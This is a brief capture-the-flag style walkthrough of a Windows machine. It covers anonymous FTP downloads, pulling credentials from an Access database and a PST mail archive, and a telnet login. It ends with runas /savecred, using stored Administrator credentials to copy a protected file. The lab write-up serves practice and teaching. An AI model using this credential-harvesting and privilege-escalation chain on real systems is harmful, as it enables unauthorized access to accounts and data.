# RunAs 

RunAs command allow us to run command as somebody else 

```
// To look for stored credentials on the machine 
cmdkey /list 

// nmap result 
PORT    STATE  SERVICE  VERSION 
21/tcp  open   ftp      Microsoft ftpd 
23/tcp  open   telnet? 
80/tcp  open   http?
```

We moving to the website in the port 80 but nothing interesting, we see ftp port is open and anonymous login is allowed here. 

```
ftp> ls 
Backups
Engineer 

// for effectively transfering the file 
ftp> binary 
ftp> cd Backups 
ftp> ls 
backup.mdb 
ftp> get backup.mdb 
ftp> cd Engineer 
Access Control.zip 
ftp> get "Access Control.zip"

// we found a mdb and pst file so for that we can use linux tool are open in windows 
mdb-sql backup.mdb 
readpst access_control.pst 
```

while reading it we found the credentials in the database and we found the engineer credentials so with made unzip the Access Control.zip and It contains a mail with the credentials for security account 

```
// we have telnet port now login using found security account credentials 
telnet -l security ip_address 

// we successfully logged in and start enumerating 
cmdkey /;os 

// to see the stored credentials and we found domain password is stored (administrator)
cmdkey /list 

// now using the save credentials to get a file in system directory 
c:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\file_name > C:\Users\security\file_name" 
```

Resource for [runas](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11))

